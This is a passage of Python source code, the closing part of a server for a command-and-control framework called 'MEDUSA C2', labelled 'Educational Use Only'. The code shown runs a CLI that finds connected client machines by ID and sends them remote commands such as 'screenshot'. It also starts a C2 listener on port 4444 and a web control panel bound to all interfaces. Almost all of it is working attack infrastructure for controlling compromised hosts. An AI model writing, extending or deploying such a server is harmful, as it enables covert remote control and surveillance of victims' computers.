                    client_id = parts[1]
                    
                    # Find client by partial ID
                    target_client = None
                    for cid, client in clients.items():
                        if cid.startswith(client_id):
                            target_client = client
                            break
                    
                    if target_client:
                        if target_client.send_command('screenshot'):
                            print(f"Screenshot requested from {target_client.hostname}")
                        else:
                            print(f"Failed to request screenshot from {target_client.hostname}")
                    else:
                        print(f"Client not found: {client_id}")
                
                else:
                    print("Unknown command. Type 'help' for available commands.")
                    
            except KeyboardInterrupt:
                break
            except Exception as e:
                print(f"CLI Error: {e}")
        
        print("CLI stopped")
    
    cli_thread = threading.Thread(target=cli_thread)
    cli_thread.daemon = True
    cli_thread.start()

def main():
    """Main server function"""
    global start_time, server_running
    
    parser = argparse.ArgumentParser(description='MEDUSA C2 Framework Server')
    parser.add_argument('--host', default='0.0.0.0', help='Web interface host (default: 0.0.0.0)')
    parser.add_argument('--port', default=5000, type=int, help='Web interface port (default: 5000)')
    parser.add_argument('--listener-port', default=4444, type=int, help='C2 listener port (default: 4444)')
    parser.add_argument('--no-web', action='store_true', help='Disable web interface')
    parser.add_argument('--cli-only', action='store_true', help='Run CLI only mode')
    
    args = parser.parse_args()
    
    global start_time
    start_time = time.time()
    
    print("\n" + "="*60)
    print("MEDUSA C2 Framework Server - Starting")
    print("Educational Use Only")
    print("="*60)
    
    # Create default listener
    if not create_default_listener():
        logger.error("Failed to create default listener")
        return 1
    
    # Start CLI if requested
    if args.cli_only or not args.no_web:
        start_cli()
    
    try:
        if args.cli_only:
            # CLI only mode
            while server_running:
                time.sleep(1)
        else:
            # Start web interface
            logger.info(f"Starting web interface on {args.host}:{args.port}")
            socketio.run(app, host=args.host, port=args.port, debug=False, allow_unsafe_werkzeug=True)
    
    except KeyboardInterrupt:
        logger.info("Shutting down server...")
    finally:
        server_running = False
        
        # Stop all listeners
        for listener in listeners.values():
            listener.stop()
        
        # Disconnect all clients
        for client in clients.values():
            client.disconnect()
        
        logger.info("Server stopped")
    
    return 0

if __name__ == "__main__":
    sys.exit(main())